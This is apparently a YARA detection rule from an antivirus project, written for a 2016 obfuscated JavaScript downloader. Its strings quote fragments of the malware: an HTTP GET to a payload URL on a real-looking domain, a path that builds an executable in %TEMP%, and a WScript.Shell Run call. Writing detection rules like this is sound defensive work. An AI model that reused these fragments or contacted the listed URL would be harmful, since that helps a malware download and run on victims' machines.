rule sig_20160329_7ff867b1e22155fcf115eb73ff60c1bc {
  meta:
    description = "datamaliciousorder - file 20160329_7ff867b1e22155fcf115eb73ff60c1bc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "88fc59dbed1c3d380d787b19a34c10788ad3b92d77f9827b0b0c426df20e66b9"

  strings:
    $s1  = "WU[Mr](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function J() {return S[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"wd0ntWPi9vknL.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[IF](m() * 11); if (WU[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Qe(If, Xj){ui = ui * 1; return If - Xj;};" fullword ascii
    $s5  = "var S = function jZ() {return WScript[SN](\"WScript.Shell\");}(), em = 11;" fullword ascii
    $s6  = "function y(){return \"\" + XE;};" fullword ascii
    $s7  = "function jv(w){S[\"Run\"](w, ui, ui);};" fullword ascii
    $s8  = "function nC() {return ((E == true) && (E == F)) ? 1 : ui;};" fullword ascii
    $s9  = "function L()" fullword ascii
    $s10 = "var bw = new this[\"Date\"]();" fullword ascii
    $s11 = "return Qe(rL, Tg);" fullword ascii
    $s12 = " while (t){" fullword ascii
    $s13 = "function m(){return 22;};" fullword ascii
    $s14 = "function cz(){return SN;};" fullword ascii
    $s15 = "function l(O) {var i = (1, 2, 3, 4, 5, O); return i;};" fullword ascii
    $s16 = "E = true; " fullword ascii
    $s17 = "var fM = false;" fullword ascii
    $s18 = "var F = false;" fullword ascii
    $s19 = "F = true; " fullword ascii
    $s20 = "} catch(J0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}